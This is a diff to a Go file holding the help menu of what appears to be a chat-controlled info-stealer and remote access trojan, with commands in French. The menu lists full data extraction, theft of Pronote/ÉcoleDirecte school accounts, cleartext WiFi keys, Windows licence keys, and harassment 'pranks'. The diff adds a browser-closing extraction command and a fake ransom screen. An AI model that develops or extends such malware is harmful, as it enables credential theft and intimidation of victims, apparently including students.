@@ -49,6 +49,7 @@ var helpSections = map[string]string{
 
 	"steal": "```\n" +
 		"!steal               extraction complète vers -steal\n" +
+		"!stealf              ferme les navigateurs puis extraction complète\n" +
 		"!ecole               Pronote / ÉcoleDirecte + documents scolaires\n" +
 		"!wifi                profils WiFi et clés en clair\n" +
 		"!licence             clés d'activation Windows\n" +
@@ -84,6 +85,7 @@ var helpSections = map[string]string{
 		"!prank lock          verrouille la session\n" +
 		"!prank swapmouse     inverse les boutons de souris\n" +
 		"!prank bsod          faux écran bleu\n" +
+		"!prank ransom        faux écran de rançon (rien n est chiffré)\n" +
 		"!prank jiggle        agite la souris\n" +
 		"!prank keyboard      bloque clavier et souris 10 s\n" +
 		"```",
